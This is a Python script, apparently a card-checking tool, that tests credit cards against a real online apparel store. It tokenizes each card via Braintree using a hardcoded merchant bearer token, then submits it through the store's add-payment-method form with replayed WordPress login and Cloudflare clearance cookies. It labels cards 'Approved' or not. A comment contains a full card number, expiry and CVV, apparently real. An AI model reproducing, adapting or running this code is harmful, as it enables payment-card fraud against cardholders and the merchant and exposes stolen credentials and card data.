def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	
	r.verify = False
	
	user = user_agent.generate_user_agent()
	
	




	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MjAzOTM2MTYsImp0aSI6ImNkNzRlZTI5LTgzYTAtNDZjYy05ZGQ4LTEzNTczNGI1YWY0NiIsInN1YiI6InF6bjdiNTl6enJxN2duMzkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InF6bjdiNTl6enJxN2duMzkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoicmVsZW50bGVzc2RlZmVuZGVyYXBwYXJlbF9pbnN0YW50In19.r4cgbfhUleX1V8QfvenoYFs63vwALLU0h2xOH_p67ubUwV0Cp9I4QARpihsTOhZ4Pe51vl3aPqXPkKjJ1owYHw',
    'braintree-version': '2018-05-10',
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'pragma': 'no-cache',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': 'dcf94f8f-f32c-455f-b554-c309b8758403',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)

# Note: json_data will not be serialized by requests
# exactly as it was in the original request.
#data = '{"clientSdkMetadata":{"source":"client","integration":"dropin2","sessionId":"dcf94f8f-f32c-455f-b554-c309b8758403"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5285460026338112","expirationMonth":"06","expirationYear":"2027","cvv":"418"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
	tok = response.json()['data']['tokenizeCreditCard']['token']
	
	
	
	
	





	cookies = {
    'cf_chl_rc_ni': '2',
    'cf_clearance': 'xo5mMdjK3DVyDl4OV7zTiw9rOzUZsYfEJjCgiiFISW4-1720306284-1.0.1.1-lP_BtNom0ByBauQsS1aQTf_6hkCZDcAjOi2UaJkgiheXeufGOyCfc3w4EeMUVQvd.H0nJOHtowGkrkqYrAGAEw',
    'l7euahzp': 'nzmc2gtk5761',
    '5y4395rb': '8f9dl4rpfwqz',
    'g2u0cqio': 'yjbw5a946jn1',
    'sbjs_migrations': '1418474375998%3D1',
    'sbjs_current_add': 'fd%3D2024-07-06%2022%3A51%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%3F__cf_chl_tk%3DsB84g1FeE3TV6_1m.nBHKPnk4KeIghwtaYE_fS0OYJc-1720306284-0.0.1.1-3582',
    'sbjs_first_add': 'fd%3D2024-07-06%2022%3A51%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%3F__cf_chl_tk%3DsB84g1FeE3TV6_1m.nBHKPnk4KeIghwtaYE_fS0OYJc-1720306284-0.0.1.1-3582',
    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
    '_fbp': 'fb.1.1720306317955.387839886745312118',
    'emotiveio': 'JS-1522-1211037015',
    'wordpress_logged_in_458d4ca3bc4f7f1cca967894c172ad61': 'moh5527vbnm%7C1721516718%7CNw1WZBml7jzWUxUwXV1Nzoiv4yceh6ib5i1sO0y5gkQ%7C287a7b22910c57a6590030cd995c6b18e6b763bcd3fe53beef1ba8a173c419ad',
    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F',
}

	headers = {
    'authority': 'relentlessdefender.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': 'cf_chl_rc_ni=2; cf_clearance=xo5mMdjK3DVyDl4OV7zTiw9rOzUZsYfEJjCgiiFISW4-1720306284-1.0.1.1-lP_BtNom0ByBauQsS1aQTf_6hkCZDcAjOi2UaJkgiheXeufGOyCfc3w4EeMUVQvd.H0nJOHtowGkrkqYrAGAEw; l7euahzp=nzmc2gtk5761; 5y4395rb=8f9dl4rpfwqz; g2u0cqio=yjbw5a946jn1; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-07-06%2022%3A51%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%3F__cf_chl_tk%3DsB84g1FeE3TV6_1m.nBHKPnk4KeIghwtaYE_fS0OYJc-1720306284-0.0.1.1-3582; sbjs_first_add=fd%3D2024-07-06%2022%3A51%3A49%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%3F__cf_chl_tk%3DsB84g1FeE3TV6_1m.nBHKPnk4KeIghwtaYE_fS0OYJc-1720306284-0.0.1.1-3582; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; _fbp=fb.1.1720306317955.387839886745312118; emotiveio=JS-1522-1211037015; wordpress_logged_in_458d4ca3bc4f7f1cca967894c172ad61=moh5527vbnm%7C1721516718%7CNw1WZBml7jzWUxUwXV1Nzoiv4yceh6ib5i1sO0y5gkQ%7C287a7b22910c57a6590030cd995c6b18e6b763bcd3fe53beef1ba8a173c419ad; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fmy-account%2Fadd-payment-method%2F',
    'origin': 'https://relentlessdefender.com',
    'pragma': 'no-cache',
    'referer': 'https://relentlessdefender.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-arch': '""',
    'sec-ch-ua-bitness': '""',
    'sec-ch-ua-full-version': '"124.0.6327.4"',
    'sec-ch-ua-full-version-list': '"Not-A.Brand";v="99.0.0.0", "Chromium";v="124.0.6327.4"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-model': '"23053RN02A"',
    'sec-ch-ua-platform': '"Android"',
    'sec-ch-ua-platform-version': '"14.0.0"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/qzn7b59zzrq7gn39/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/qzn7b59zzrq7gn39"},"merchantId":"qzn7b59zzrq7gn39","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Visa","MasterCard","Discover","JCB","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Relentless Defender Apparel","clientId":"ARDQ8mrbzzHppQJSRz7mnPqlpACL0XxOpSF-HRcWOym0Cg3OLuRwzbg2P9BorJhd7LxLjKKMZqFvwVQO","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"relentlessdefenderapparel_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
    'woocommerce-add-payment-method-nonce': '2fdd3dfa35',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = requests.post(
    'https://relentlessdefender.com/my-account/add-payment-method/',
    cookies=cookies,
    headers=headers,
    data=data,
)
	
	
	text = response.text
	
	pattern = r'Status code (.*?)\s*</li>'
	
	
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
		    result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
			
	
				
	return result
